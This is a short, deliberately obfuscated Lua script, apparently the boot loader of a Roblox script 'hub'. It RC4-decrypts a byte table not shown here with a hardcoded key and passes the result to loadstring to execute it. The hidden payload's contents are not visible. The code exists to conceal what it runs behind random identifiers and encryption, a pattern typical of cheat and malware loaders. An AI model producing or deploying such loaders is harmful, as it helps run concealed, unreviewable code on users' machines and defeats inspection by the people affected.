local fNzkSqWY = "nQbWuTYomOtCMwld"

local function HeuFrfYt(OEqyklMy_data, OEqyklMy_key)
    local OEqyklMy = {}
    for BdmZjnyS = 0, 255 do OEqyklMy[BdmZjnyS] = BdmZjnyS end
    local KNzZNhWl = 0
    for BdmZjnyS = 0, 255 do
        local OdUhMfgL = OEqyklMy_key:byte((BdmZjnyS % #OEqyklMy_key) + 1)
        KNzZNhWl = (KNzZNhWl + OEqyklMy[BdmZjnyS] + OdUhMfgL) % 256
        OEqyklMy[BdmZjnyS], OEqyklMy[KNzZNhWl] = OEqyklMy[KNzZNhWl], OEqyklMy[BdmZjnyS]
    end
    local BdmZjnyS = 0
    local KNzZNhWl = 0
    local MkOsXkhE = {}
    for _, GBVCwOgX in ipairs(OEqyklMy_data) do
        BdmZjnyS = (BdmZjnyS + 1) % 256
        KNzZNhWl = (KNzZNhWl + OEqyklMy[BdmZjnyS]) % 256
        OEqyklMy[BdmZjnyS], OEqyklMy[KNzZNhWl] = OEqyklMy[KNzZNhWl], OEqyklMy[BdmZjnyS]
        local OdUhMfgL = OEqyklMy[(OEqyklMy[BdmZjnyS] + OEqyklMy[KNzZNhWl]) % 256]
        table.insert(MkOsXkhE, string.char(bit32.bxor(GBVCwOgX, OdUhMfgL)))
    end
    return table.concat(MkOsXkhE)
end

local OEqyklMy_flat = {}
for _, chunk in ipairs(VSCSOsic) do
    for _, byte in ipairs(chunk) do
        table.insert(OEqyklMy_flat, byte)
    end
end

local decrypted = HeuFrfYt(OEqyklMy_flat, fNzkSqWY)
local jrdunHMi, jrCARUdX = loadstring(decrypted)
if jrdunHMi then 
    return jrdunHMi() 
else 
    warn("[ecco] Boot Error (" .. "hub" .. "): " .. tostring(jrCARUdX)) 
end
